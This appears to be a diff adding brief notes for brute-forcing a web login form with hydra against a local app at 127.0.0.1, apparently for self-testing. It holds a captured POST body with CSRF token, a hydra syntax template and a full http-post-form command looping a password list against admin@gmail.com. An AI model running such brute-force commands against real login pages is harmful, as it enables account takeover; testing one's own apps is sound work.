@@ -1,0 +1,14 @@
+admin@gmail.com
+passwordlist.txt
+127.0.0.1
+5000
+POST
+/
+csrf_token=ImM2NTRmMGI3MTkwNzI0MDcyNmU3ZmU1MThmOGM1MzAyZmIwOTFjYzUi.Y7Behw.H1S8sgd0McwxmU92XtUbvXND5qg&email=admin%40gmail.com&password=asd&submit=Login
+Invalid login attempt 
+
+hydra <Username/List> <Password/List> <port> <IP> <Method> "<Path>:<RequestBody>:<Incorrect Verbiage>"
+
+hydra -l admin@gmail.com -P passwordlist.txt -s 7000 127.0.0.1 http-post-form "/myapp/:csrf_token=ImQxNjRjOTdhMmE2YmJmZWYzZGVlNDEzZWJkN2YxOWY3Yjc5ZWIzYWIi.Y706-g.bZcjNYeUV9z1DJOWbmVcc643a8w&csrf_token=ImQxNjRjOTdhMmE2YmJmZWYzZGVlNDEzZWJkN2YxOWY3Yjc5ZWIzYWIi.Y706-g.bZcjNYeUV9z1DJOWbmVcc643a8w&email=admin%40gmail.com&password=^PASS^&g-recaptcha-response=03AD1IbLBrBRgRzLJ7lQoUOpw835K3vrJK6Mf8gfRK2deMLGxBws_pzDFywC4z7Tj___H3EcydwtV9cknSJRS4hWimtfVQyx9A4LZlYj0SxY-W_CrLyiqt-xGqBUjEVI1YilGRCR0iwwLkLTN6hpfJ2mjw0oVMIDnz1KIeH5_a-Lf3cdtKq74R7jPbN9DLRBOPiBqDu1d5Uns0al8ioAoC8_Zdj23ogpjPMOwueagzJ28W6gR1-dffmP8ps5oLsnoekzRfPywjmje84XrGDSSIqvFpkviS8rniHKnJsbJVCRQj9F8FVAU2atu_RnXcpff92EvrM4NAaPzr1WdJ6W95QlKjueyehiTa5LSgrdqGRE_BNbDG--UM4_TMzRORmIw_PBZm9F2KGIkGKzop3ONGkGO0A9BT_TCv4yZV-ZjX5hQiogHWrJXAhaNRoUJJiqdem1EQN00x4eyQv6asBiunGvG2Sl7mB_OCBzc3ZhjvdbluXWUadSiY88i30Iuu2NIYLZWNymPD4ysHuDom2ENHNnQV5vG0yIRgYA&submit=Login:Invalid login attempt"
+
+
